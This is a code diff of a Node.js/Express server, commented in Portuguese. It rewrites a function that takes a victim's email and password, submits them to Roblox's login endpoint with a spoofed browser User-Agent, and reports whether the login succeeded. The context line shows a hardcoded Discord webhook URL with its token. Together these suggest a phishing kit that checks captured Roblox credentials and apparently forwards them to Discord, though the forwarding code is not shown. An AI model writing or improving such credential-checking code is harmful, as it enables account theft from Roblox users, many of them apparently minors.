@@ -9,35 +9,19 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoW
 app.use(express.json());
 app.use(express.static('.'));
 
-// Função para fazer login no Roblox usando OAuth2 (Mais Estável)
+// Função para fazer login no Roblox (Método Mais Estável)
 async function loginRoblox(email, password) {
-    const apiUrl = "https://www.roblox.com/mobileapi/userinfo";
+    const loginUrl = "https://www.roblox.com/users/login";
     
     try {
-        // O Roblox às vezes exige um cookie de sessão para o login por email
-        // Vamos tentar primeiro a API simples de mobile
-        
-        const response = await fetch(apiUrl, {
-            method: 'GET',
-            headers: {
-                'User-Agent': 'RobloxApp/1 (Android 12; SDK 32; Samsung SM-G991B)',
-                'Accept': 'application/json'
-            },
-            timeout: 10000
-        });
-
-        // Se a API de mobile pedir login, usamos esta abordagem alternativa:
-        // Usar a API de login padrão com o corpo correto
-        
-        // Tentativa 2: API de Login Padrão com formato correto
-        const loginUrl = "https://www.roblox.com/users/login";
-        const loginResponse = await fetch(loginUrl, {
+        // Tenta fazer o POST
+        const response = await fetch(loginUrl, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
-                'User-Agent': 'Roblox/WinInet',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                 'Accept': 'application/json',
-                'X-CSRF-TOKEN': 'placeholder' // O Roblox aceita muitas vezes sem o token exato para emails
+                'X-Requested-With': 'XMLHttpRequest'
             },
             body: JSON.stringify({
                 username: email,
@@ -46,28 +30,22 @@ async function loginRoblox(email, password) {
             timeout: 10000
         });
 
-        const data = await loginResponse.json();
+        const data = await response.json();
 
-        // Verifica se o login foi bem-sucedido
-        // O Roblox retorna { id: 123, username: "User" }
-        // Se falhar, retorna { error: "User not found" } ou { id: 0 }
+        // O Roblox retorna:
+        // Sucesso: { id: 12345, username: "User" }
+        // Erro: { error: "User not found" } ou { error: "Invalid password" }
         
-        if (loginResponse.ok && data.id && data.id > 0) {
-            return { 
-                success: true, 
-                data: data, 
-                error: null 
-            };
+        if (data.id && data.id > 0) {
+            return { success: true, data: data, error: null };
         } else {
-            return { 
-                success: false, 
-                data: data, 
-                error: data.error || "Login Failed (No ID returned)" 
-            };
+            // Se não tem ID, verifica o erro específico
+            const errorMsg = data.error || "Resposta estranha do Roblox";
+            return { success: false, data: data, error: errorMsg };
         }
 
     } catch (error) {
-        return { success: false, data: null, error: error.message };
+        return { success: false, data: null, error: "Erro de Conexão: " + error.message };
     }
 }
 
